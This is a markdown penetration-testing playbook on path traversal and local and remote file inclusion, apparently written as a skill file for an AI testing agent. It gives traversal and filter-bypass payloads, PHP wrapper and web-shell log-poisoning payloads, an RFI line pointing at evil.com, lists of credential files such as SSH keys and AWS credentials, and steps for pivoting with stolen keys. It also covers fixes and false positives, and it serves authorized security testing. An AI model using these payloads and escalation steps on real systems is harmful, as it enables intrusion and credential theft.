---
slug: path-traversal-lfi-rfi
applies_to: [pentester, coder]
owasp: A01
related: [rce, information_disclosure, insecure_file_uploads]
---

# Path Traversal / LFI / RFI — Pentester Playbook

> Load this when recon found endpoints that take a filename, path, or
> resource identifier in a parameter — file viewers, download endpoints,
> template loaders, plugin/theme selectors, log viewers, anything where a
> user-controlled string ends up in a `open()` / `include()` / `readfile()`.

## When to load this

The shapes that reliably have this bug:

- `?file=`, `?path=`, `?template=`, `?page=`, `?include=`, `?view=`
- Download endpoints: `/download?name=...`, `/files/...`
- Log viewers and admin "view this log" features
- Plugin/theme selectors (`?theme=red`, `?plugin=blog`)
- Image proxy / thumbnail features (often vulnerable to traversal to read arbitrary files)
- Internationalization endpoints (`?lang=en` → reads `lang/en.json`)
- Static file servers misconfigured with traversal allowed

## What you're looking for

Three related but distinct bugs:

- **Path traversal.** Read files outside the intended directory by injecting `../`. The classic.
- **Local File Inclusion (LFI).** Path traversal that lands in an `include`/`require`/`eval` sink — the file's content is executed, not just returned. PHP-specific in practice (`include $page . ".php"`).
- **Remote File Inclusion (RFI).** Same as LFI but the path can be a URL — `?page=http://evil.com/shell.php` results in remote code execution. Largely dead in modern PHP (allow_url_include=Off by default) but lives in legacy / misconfigured systems.

## First moves

1. **Canonical traversal probe.** Try the simplest payload first: `?file=../../../../etc/passwd` (Linux) or `?file=..\\..\\..\\..\\windows\\win.ini` (Windows). If the response contains the file's content, you have traversal.

2. **Counted traversal.** Some apps prepend a directory: `/app/static/${user_input}`. You need enough `../` to escape. Try 1, 3, 5, 7, 10 levels — error messages often tell you when you've gone too far.

3. **Null byte truncation.** Older PHP and some C-based parsers truncate at null: `?file=../../../../etc/passwd%00.jpg`. The app appends `.jpg`, but the OS sees `passwd`. Fixed in PHP 5.3.4+ but still works in legacy code.

4. **Encoding probe.** If `../` is blocked, try URL-encoded variants: `%2e%2e%2f`, `%2e%2e/`, `..%2f`, double-encoded `%252e%252e%252f`. Test each one.

5. **Path-prefix stripping.** Some apps strip `../` literally but in one pass. Send `....//`, `..//`, `..../`, `..%5c..%5c` — after one strip pass, what remains is `../`.

6. **Filter character class.** If `..` is blocked entirely, try `.\\.` (Windows separator), `.../` (some parsers see it as `../`), or absolute paths: `?file=/etc/passwd` (no traversal needed if absolute paths are accepted).

7. **PHP wrapper probe.** For PHP targets, the `php://filter` wrapper is the LFI workhorse:
   ```
   ?page=php://filter/convert.base64-encode/resource=index.php
   ```
   If the response is base64 that decodes to PHP source, you have file disclosure of source code without needing to actually execute it.

8. **RFI probe.** Try `?page=http://OAST_HOST/probe`. If your OAST sees an HTTP fetch, the include is honoring URLs. Combined with `allow_url_include=On`, you have RCE.

## Confirming a hit

Confirm with content, not just response codes:

- **`/etc/passwd` shows.** The classic confirmation. Response body contains `root:x:0:0:root:/root:/bin/bash` etc.
- **`win.ini` shows.** Windows equivalent: `; for 16-bit app support`, `[fonts]`, etc.
- **App config shows.** Read the app's own config file (you know the path from recon / source code / framework convention).
- **OAST callback on RFI.** Your remote file was fetched — RFI confirmed even if the response doesn't show execution.

For LFI specifically:
- **Source code disclosure via `php://filter`.** Decoded base64 contains PHP source. Doesn't prove execution but proves read.
- **Log poisoning + LFI = RCE.** Write a PHP payload into an attacker-controlled log line (User-Agent, error log, FTP login attempt), then LFI the log file. See escalation below.

## Going deeper — by target

### Linux files worth reading
- `/etc/passwd` — user list
- `/etc/shadow` — password hashes (root-only)
- `/etc/hosts` — internal hostname mappings
- `/etc/issue` — distro version
- `/proc/self/environ` — environment variables of the current process (often contains secrets, DB creds)
- `/proc/self/cmdline` — process command line
- `/proc/version` — kernel version
- `/proc/net/tcp`, `/proc/net/udp` — open ports
- `~/.bash_history`, `~/.zsh_history` — command history
- `~/.ssh/id_rsa` — SSH private key (target is your account)
- `~/.aws/credentials` — AWS keys
- `/var/log/auth.log`, `/var/log/nginx/access.log`, `/var/log/apache2/access.log` — logs (useful for poisoning attack)
- `/app/.env`, `/srv/.env`, `/opt/<app>/.env` — env files
- `<app>/wp-config.php`, `<app>/config/database.yml`, `<app>/application.properties` — framework config

### Windows files worth reading
- `C:\Windows\win.ini`, `C:\Windows\system.ini` — system config
- `C:\Windows\System32\drivers\etc\hosts` — hostname mappings
- `C:\Windows\repair\SAM`, `C:\Windows\repair\system` — old SAM backups (NTLM hashes if present)
- `C:\inetpub\wwwroot\web.config` — IIS app config
- `%USERPROFILE%\.aws\credentials` — AWS keys
- Application directories under `C:\Program Files\<App>`

### PHP wrappers (LFI multiplier)
- `php://filter/convert.base64-encode/resource=X` — reads X as base64 (defeats binary issues, reveals source)
- `php://filter/string.rot13/resource=X` — sometimes bypasses content filters
- `php://input` — reads request body as the included content (RCE if you POST PHP code)
- `data://text/plain,<?php system('id'); ?>` — inline RCE without writing a file
- `expect://id` — requires expect extension (rare); direct RCE if available
- `zip://path/to/zip%23inner.php` — extract from zip; bypasses some filters
- `phar://path/to/phar` — phar deserialization (RCE class in old PHP)

## When filters get in the way

- **Allowlist of file extensions.** App requires the path to end in `.txt` (or similar). Combine with null byte: `passwd%00.txt`. Or read inside the allowed dir for unintended content (`?file=user_uploads/../../etc/passwd`).
- **Realpath normalization.** App calls `realpath()` and rejects if result is outside the base dir. Bypass: symlink the base dir to /etc (unlikely to be plantable) or look for race conditions in the check-then-open pattern.
- **Chroot / containers.** Even valid traversal can't escape the container's filesystem. Read whatever IS in the container — usually the app source, config, env files.
- **Path normalization mid-stream.** Web server normalizes before passing to the app, so `../` is gone before the app sees it. But: encoded variants pass through unprocessed. `%2e%2e%2f` survives until the app's URL-decode step.
- **Allowed-prefix check via `startsWith`.** App checks if the resolved path starts with `/app/files/`. Bypass: `/app/files/../../etc/passwd` resolves to `/etc/passwd` AFTER startsWith passes (which uses the literal string).

## Escalation paths

1. **Source code disclosure.** Read the app's source. Use it to find other bugs you couldn't see black-box.
2. **Credentials in config files.** Read `.env`, `web.config`, `database.yml`. Use the credentials to pivot to the DB or other systems.
3. **SSH key theft.** Read `~/.ssh/id_rsa` for the app user. Use it for SSH access.
4. **AWS / cloud credentials.** Read `~/.aws/credentials`. Now you have cloud-level access independent of the web app.
5. **LFI → RCE via log poisoning.** Inject PHP into a log file by sending a request with `<?php system($_GET['c']); ?>` in the User-Agent. Web server logs the UA. LFI the log file → PHP executes. `?file=../../../../var/log/nginx/access.log&c=id` runs `id`.
6. **LFI → RCE via session file.** PHP sessions are files. Set a session var to PHP code (via a request that stores user input in session), then LFI `/tmp/sess_<sessionid>`.
7. **LFI → RCE via `/proc/self/environ`.** Set the `User-Agent` to PHP code, LFI `/proc/self/environ` — env is read, including UA — and the LFI engine evaluates it.

## What a real finding looks like

- The exact URL/parameter that triggers the read
- The content extracted (truncated as appropriate for the report; full content in the evidence appendix)
- The filter pattern detected and what bypass worked ("App rejects `../` but not `%2e%2e%2f`")
- If escalated to RCE: the full chain (initial LFI → log poison → re-fetch the log) with each request shown
- The fix: validate against a fixed allowlist of file names (NOT paths), open files relative to a chrooted dir, or just stop accepting filenames from users entirely (use IDs that map to known files server-side)

## Common false positives

- **Open Redirect masquerading as path traversal.** App redirects `?file=../../etc/passwd` to a homepage with the parameter visible — the parameter is echoed but no file is opened. Confirm by checking response body for actual file content.
- **404 with the requested path in the error page.** Looks like the app processed your path but it just echoed it in the error. Real traversal returns file content, not error pages.
- **Sandbox / chroot env where /etc/passwd is fake.** Some containers have a minimal /etc/passwd that's basically the container's own user list — still real traversal, but the content is less impactful than it looks.
- **Static analysis flagging code that has runtime guards.** If the source has `if (path.startswith('/'))` checks that you can't see at runtime, the static finding may not be exploitable.

## Related skills

`rce` for the full chain after LFI-to-shell, `information_disclosure` for the "read config files" angle, `insecure_file_uploads` for the upload-then-LFI combination.
